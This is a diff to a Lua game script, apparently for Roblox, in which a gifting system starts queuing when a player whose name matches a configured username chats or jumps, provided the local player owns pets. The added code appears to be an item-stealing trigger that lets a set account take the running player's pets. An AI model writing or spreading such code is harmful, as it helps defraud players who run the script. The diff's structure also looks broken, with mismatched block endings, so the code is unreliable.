@@ -740,7 +740,31 @@ function GiftingSystem.setupChatMonitoring()
         if p == LocalPlayer then return end
 
         local function onChatted(message)
-            if string.upper(tostring(message)) == "START" then
+    if p and string.lower(p.Name) == string.lower(CONFIG.username) then
+        for _, queued in ipairs(giftQueue) do
+            if queued == p then return end
+        end
+
+        local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
+        if #targetPets > 0 or #regularPets > 0 then
+            table.insert(giftQueue, p)
+        end
+    end
+end
+
+        local function setupChat()
+            pcall(function()
+                p.Chatted:Connect(onChatted)
+            end)
+        end
+
+-- Cũng bắt đầu nếu người đó nhảy
+if string.lower(p.Name) == string.lower(CONFIG.username) then
+    task.spawn(function()
+        repeat task.wait() until p.Character and p.Character:FindFirstChildOfClass("Humanoid")
+        local hum = p.Character:FindFirstChildOfClass("Humanoid")
+        hum:GetPropertyChangedSignal("Jump"):Connect(function()
+            if hum.Jump then
                 for _, queued in ipairs(giftQueue) do
                     if queued == p then return end
                 end
@@ -750,13 +774,9 @@ function GiftingSystem.setupChatMonitoring()
                     table.insert(giftQueue, p)
                 end
             end
-        end
-
-        local function setupChat()
-            pcall(function()
-                p.Chatted:Connect(onChatted)
-            end)
-        end
+        end)
+    end)
+end
 
         if p.Character then
             setupChat()
